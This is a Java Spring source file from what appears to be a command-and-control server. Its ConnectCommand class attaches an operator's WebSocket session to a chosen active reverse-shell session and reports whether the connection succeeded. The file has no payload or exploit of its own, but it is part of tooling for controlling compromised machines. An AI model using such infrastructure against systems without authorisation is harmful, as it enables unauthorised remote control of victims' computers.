package com.mtattab.c2cServer.service.commands;

import com.mtattab.c2cServer.model.ManagerCommunicationModel;
import com.mtattab.c2cServer.model.MessageEventModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.service.ReverseShellManagerService;
import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import org.springframework.context.ApplicationEventPublisherAware;

import static com.mtattab.c2cServer.model.enums.ActiveSessionsEvents.MANAGER_TO_REVERSE_SHELL_CONNECTION;


@Component
@Slf4j
public class ConnectCommand implements Command,  ApplicationEventPublisherAware {
    @Autowired
    ActiveSessionsObservable activeSessionsObservable;


    private ApplicationEventPublisher applicationEventPublisher;

    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        Optional<WebSocketSession> targetSessionToBeConnectedTo = SocketUtil.findSessionByIdInSessionSet(
                activeSessionsObservable.getActiveReverseShellSessions(),args.get(1));

        if (targetSessionToBeConnectedTo.isPresent()){
            connectToSession(currentSocket, targetSessionToBeConnectedTo.get());
        }else {
            SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("session '%s' not found ", args.get(1)))
                    .build()
            )));
        }

    }

    private void connectToSession(WebSocketSession currentSocket, WebSocketSession socketToConnectTo){
//        establish connection between two manger socket and reverse shell socket
        this.applicationEventPublisher.publishEvent(
                new MessageEventModel(this, MANAGER_TO_REVERSE_SHELL_CONNECTION, currentSocket,socketToConnectTo));

        SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                .msg(String.format("Connected successfuly to socket: '%s'",socketToConnectTo.getId()))
                .build()
        )));
    }

    @Override
    public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) {
        this.applicationEventPublisher = applicationEventPublisher;

    }
}
